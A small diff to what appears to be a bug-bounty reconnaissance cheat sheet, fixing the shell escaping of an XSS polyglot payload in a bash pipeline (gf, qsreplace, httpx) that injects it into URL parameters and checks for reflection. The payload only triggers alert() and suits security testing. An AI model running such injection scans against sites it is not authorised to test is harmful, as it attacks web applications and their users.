@@ -41,7 +41,7 @@ cat urls.txt | kxss 2>/dev/null | grep -v "Not Reflected" | anew reflected_param
 
 ### XSS Polyglot Testing
 ```bash
-cat urls.txt | gf xss | qsreplace "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcLiCk=alert() )//" | httpx -silent -mr "alert"
+cat urls.txt | gf xss | qsreplace "jaVasCript:/*-/*\`/*\`/*'/*\"/**/(/* */oNcLiCk=alert() )//" | httpx -silent -mr "alert"
 ```
 
 ---
